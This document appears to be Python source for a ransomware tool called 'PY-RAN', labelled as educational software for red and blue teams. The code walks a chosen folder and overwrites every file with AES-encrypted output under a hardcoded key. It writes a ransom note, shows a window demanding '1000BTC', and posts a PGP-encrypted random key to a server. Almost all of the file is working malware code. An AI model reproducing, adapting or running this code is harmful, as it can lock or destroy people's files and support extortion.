# coded by zer0_p1k4chu
# Simple Ransomware for blue/red teams to test their defenses against ransomwares. Purely for Educational purposes.
# Author not responsible for any damage caused by using this tool.
#!/usr/bin/python3
import argparse
import os
import base64
import pyAesCrypt
import random
import string
import PySimpleGUI as sg
import requests
import pgpy
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
parser = argparse.ArgumentParser()
parser.add_argument("--dir",help="Location of the Folder you want to simulate")
parser.add_argument("--mode",help="Accepts encrypt or decrypt arguments.")
parser.add_argument("--password",help="Password to use for encryption/decryption.")
args = parser.parse_args()
def EncryptFile(file,password):
    bufferSize = 64 * 1024
    pyAesCrypt.encryptFile(file, file+".pyran", password, bufferSize)
    os.remove(file)

def DecryptFile(file,password):
    bufferSize = 64 * 1024
    pyAesCrypt.decryptFile(file, file.split(".pyran")[0], password, bufferSize)
    os.remove(file)

def fast_encrypt(infile, pw):
    with open(infile, 'rb') as file_data:
        key = bytes('warm2daywarm2day', 'utf-8')
        # print(str(key))
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(file_data.read())
    with open(infile, 'wb') as file_out:
        [ file_out.write(x) for x in (cipher.nonce, tag, ciphertext) ]
    os.rename(infile, infile + '.pyran')

def fast_decrypt(infile, pw):
    key = bytes(pw, 'utf-8')
    with open(infile, 'rb') as file_data:
        nonce, tag, ciphertext = [ file_data.read(x) for x in (16, 16, -1) ]
        cipher = AES.new(key, AES.MODE_EAX, nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)
    with open(infile, 'wb') as outfile:
        outfile.write(data)
    newname = infile.split(".pyran")[0]
    os.rename(infile, newname)


def encrypt_data(password, dire='../azure_blob_analytics/'):
    for file in [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk(dire)] for val in sublist]:
        # EncryptFile(file,password)
        try:
            fast_encrypt(file, password)
        except PermissionError:
            continue
    print("Encryption Done!")
    f = open("ransom.txt","w+")
    f.write("PY-RAN ransomware simulated successfully encrypted the files.")
    f.close()

def decrypt_data(password, dire='../azure_blob_analytics/'):
    for file in [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk(dire)] for val in sublist]:
        try:
            fast_decrypt(file,password)
        except (ValueError, FileNotFoundError): # sometimes files that exist don't get decrypted??
            # .DS_STORE file
            continue
    print("Decryption Done!")

def generate_encryption_key(x):
    key = string.ascii_letters
    return (''.join(random.choice(key) for i in range(x)))

def pgp_encrypt(x):
    pubkey = """LS0tLS1CRUdJTiBQR1AgUFVCTElDIEtFWSBCTE9DSy0tLS0tCgptUUdOQkdKR01YSUJEQURFbG9n
cVlBT2EvOVc0SUVHTjFBZGJucTZnTGUrNHFKc2V1S3lhaWZYMDdPTkgrczlLCkJ6N2QrVUFyeHdh
U1RuNjR2YXc5K240YUxVWk0zMVVyQldPa1pleDdCaWUxZWFwQ1hGdzZHbjNObDcweDVuUUEKcHQ3
NEFwU0ZJdWRTSFI3UXc5a2I4OWxZV3UzbnBaaDJ4Qk81bVhxd0pMZE5IUXVlbmQ3TGxlQ1gweWdh
U0ZRKwpPNHFORlRISS9ORDZKT29yVEV4OWp3aHJBL2NmWG9aZTFUdXI4ZXRoU2dkQlBLcEtJKzZ1
VFlLZFRKcHBJeDBsCkp3U3hXR3IyZktEMEx6cy83cE5tdXpqdk05d083Q2Zob3NlTk5GdUFudU1M
akxhUklrRUdNcE1jR1ZlZXFyeG4KSHo3MVhiWXRqUTNJa3VlWlJkeU8rdEhBOGRkak1WdVBCbnY4
NzdUWkE4WUxEcGFrUW8vcFhZU2tVeWt4TTR4TQpGaUNHVjRqWWJkek1Tb3QzRVQyNWVBREpjM3dR
SEw1MGhJQ0xucWRyR0VqNENPeEVFN2dVTjFmVkJKbTJIbnBPClBTYkF2TGlQQ3RYS0hUZEdVN3I3
MVZsbWptVjNzZktaODJGTFQxYU1NMEd3QW95Q01CYmhKM1BRTXR6SEZLUWcKTEoxWjZtZDdTOUdl
UG04QUVRRUFBYlFvWm14dmIyWWdQR3hoZG1Gc1pYUjBaV2hsWVd4MGFHTnZkVzVqYVd4QQpaMjFo
YVd3dVkyOXRQb2tCMUFRVEFRb0FQaFloQkJENDgwVjI4bFZlc0xFZ0dadnlEeWJJRTFBaEJRSmlS
akZ5CkFoc0RCUWtEd21jQUJRc0pDQWNDQmhVS0NRZ0xBZ1FXQWdNQkFoNEJBaGVBQUFvSkVKdnlE
eWJJRTFBaGlMOEwKK1FGK3ovSVVZWlg0WDZtcU8vWlBSMy9RNDE2SnNkSmVxc29CTHpvdVUrbVpv
cm1OTHJHbEZIWnd3VWpUTUp4ZAovZmN0cEdiaXJBZk9ra01CU0t6S0ZzeWhsWkRad1lOajcwK2RL
cXJKbityUHBXUnJuZzI5RkxSem9oRVhyQWdyClV3d0ZKdklOSTQyL2s5UTBZUVd6S1VLTDAvOE5N
VFdzemo2YnlNVkxVU3laZm40QlZzTHRJeHhlWEdrdUdvQW0KWkx5UDQzWUE2WWRXMTJRSEluOXlC
aVNiZE1Cd0g3bnNKRzdCK29ROGduNUd2aGNwLzlYeXp3NDRBS3d3b2JJSwpWNXBkc1p6RHF4MytE
TW5hR0V6Mnp4U244R2wxMHc5N09aU3pGd0RhVXFGVWw3VVZwL0xkbUFYQnB4TmlUZ0UrCmZRUlRo
YklQOHlobE9oY3c2TmYxNlovSnNRTjVVdXVqZ0ZMMnIzQTVmQm01WmJzd05yTVBFRXBCaVVsUkhM
cUgKLzQxTFhTRXpIS09XVjd1a2hBVDU5dTlFSXRUVzU1c3FXaUo1dDN6NWVSN3lCTUhTUlJvQks2
NW5ISDdkMjgxaAo2OXFlNWU0eXAwZStUZ2trREViUzR0WnR0K243RTM3RUdFZC95dW5WTGQyazc5
eFZadHdKRFVGdUZVMXNqeFhzClpia0JqUVJpUmpGeUFRd0F2WWtRaGd5aU12MCsyY0w2Q1BQQ1Jl
SzZhTU1sR1p2aVIzK1VhSGlHOFc0ZTNYd3AKMEZ0SytiZStSQ1pVS2l4TzBma3pxWlNHSjRLNkZP
b0l4bGdZU1ppcG8rOG1LS3Q4ZmZKL0MrVytjOS93YzNPNwpQSWVUZmM3Y1ZKWU1SbWF1MjBUUnBQ
QWh4Q2poeHpoZ0Y1Y3ZXRyt2cmJRT1N0OWtzRy91TGFpL0JIdnB0Vk5oCkdYc0NlaVI2R0F1bGY0
cC83TTR5QjZMUVEwck51eURUN2VCYjF5aWVTNnhHUmVpb2hNRXYyekE4RDNBcFRVSHMKRmRvSGpG
K1E0ckhhVVZpbVRza3VyNUtyRTB0RkxrTld0WENsV0drVWpVQXVCQ0lXNGMrTlJESzVHdnhOUHI2
YgpkaHREdHNraGp0TjFHQUdpOVRUb3NtUjcyaXFPZkJkNmFpMFNiVlVGcFozbm1MQjVXYWtkUkhZ
bi91RTVIS3NJCmczcktKbjhiMi9FTzhUMU5SL29NQ1phODhEQkRiNUZlUHViMHN3K3ZGdmpPcGNE
L3BPdlZ1ZkQyRDF2akkwcUMKQWdVZFZnbUJtdE1aMFN6WmFFQ3VybUg0RnluMGZGMnRYRFl3bTJp
aERVSUM4SzRhcUgyQXhyQWJZRGNzZkxxbQpXQ3UyYWhuenNWVnN3Um9OQUJFQkFBR0pBYndFR0FF
S0FDWVdJUVFRK1BORmR2SlZYckN4SUJtYjhnOG15Qk5RCklRVUNZa1l4Y2dJYkRBVUpBOEpuQUFB
S0NSQ2I4ZzhteUJOUUlSNXlDL3dNU1hMd3ZaK0lxcGZlNHdqaU11SUUKeHdvZEVXUE9FbXZwbDI4
TGgvY2ZPNm51UE5SRkRrVFFUVmFCOHpwcWlTWTFMS3hkbENPVnVraENqeTkrTkliQgpUcHYxS1NV
aHZIVFhQOGowcUkzRjBwUythdEJna0k1ZDI2WEZUK2JqaDFRM05tVTVSU01LZWNsYmJvbERCT3Ay
CjJSNUcydmp0aEtIUVNFZkdjOUFUTEU3aEE0djMwSGpzK2xlWVVoVGlXcTJzUDBaZ0JZQmxpTERS
UTlSUzlSMjUKcW9lbFA2T2RSaU5mNk9QVTFPdGdlSkdqZS9MRlRkbTF1ZUpuMGRnQ1Z4R1JHdTVT
S1FLcTRNcnlManJTYndJTApFb043RE9vVXdDZXN4WkorOVF3QkpzdXB5alhuWVpLU0Q1Q0RMVXd6
NTdTQ2xBL2ZUY1JTQzhLQlIvbzU3d2RDCmtNdnRvMEFJTWYvSVloczlualpOU0NOU2ltcWtjQzRm
c253NENsWHlaeURuYkZPK1oyYzdXZ3ZYWldleHpGVVkKUStnN1UrSFR5NFIyTDJnK2Z5ODlzWlBY
OVd1cXBwZ2ttTkdJczlqMnVQQ1QyRkNlRlRwQlc4ck1Fc3BmOU1vQgpjQ3hNRUlxOGtTZ2NTZ0pS
UjBsYnJSaGM5VHJONDdaci9sbmN0TzJpc3RJPQo9MmhDUgotLS0tLUVORCBQR1AgUFVCTElDIEtF
WSBCTE9DSy0tLS0tCg=="""
    decoded_pubkey = base64.b64decode(pubkey)
    key, _ = pgpy.PGPKey.from_blob(decoded_pubkey)
    enc_key = pgpy.PGPMessage.new(x)
    encrypted_x = key.encrypt(enc_key)
    return str(encrypted_x)


if __name__ == '__main__':
    # fast_encrypt("./test/test.txt", "Warm2Day")
    # fast_decrypt()
    # Define the window's contents
    layout = [[sg.Text("Your files have been encrypted. ")],
            [sg.Text("Pay 1000BTC to recieve decryption key.")],
            [sg.T("")], [sg.Text("Choose a folder: "), sg.Input(key="-DIR-" ,change_submits=True), sg.FolderBrowse(key="-DIR-")],[sg.Button("Submit")],
            [sg.Text("Enter Encryption Key...")],
            [sg.Input(key='-EINPUT-')],
            [sg.Text("Enter Decryption Key...")],
            [sg.Input(key='-DINPUT-')],
            [sg.Text(size=(40,1), key='-OUTPUT-')],
            [sg.Button('Decrypt Files'),sg.Button('Encrypt'), sg.Button('Quit')],
            [sg.Button('Send a Post')]]

    # Create the window
    window = sg.Window('Ran Some Where', layout)

    # Display and interact with the Window using an Event Loop
    while True:
        event, values = window.read()
        # See if user wants to quit or window was closed
        if event == sg.WINDOW_CLOSED or event == 'Quit':
            break
        # Output a message to the window
        
        if event == 'Decrypt Files':
            window['-OUTPUT-'].update('Decrypting files with key: ' + values['-DINPUT-'] + ". . .")
            decrypt_data(values['-DINPUT-'], values['-DIR-'])
            # decrypt_data(values['-DINPUT-'], './test/')
            # fast_decrypt('./test/test.txt.pyran', values['-DINPUT-'])

        elif event == 'Encrypt':
            window['-OUTPUT-'].update('Encrypting files with key: ' + values['-EINPUT-'] + ". . .")
            encrypt_data(values['-EINPUT-'], values['-DIR-'])
        elif event == 'Send a Post':
            url = 'http://localhost:8080'
            key = generate_encryption_key(25)
            encrypted_key = pgp_encrypt(key)
            b64encoded_encrypted_key = base64.b64encode(encrypted_key.encode('ascii'))
            print(encrypted_key.encode('utf-8'))
            print(str(b64encoded_encrypted_key))
            obj = {'this': str(b64encoded_encrypted_key)}
            x = requests.post(url, data = obj)

    # Finish up by removing from the screen
    window.close()
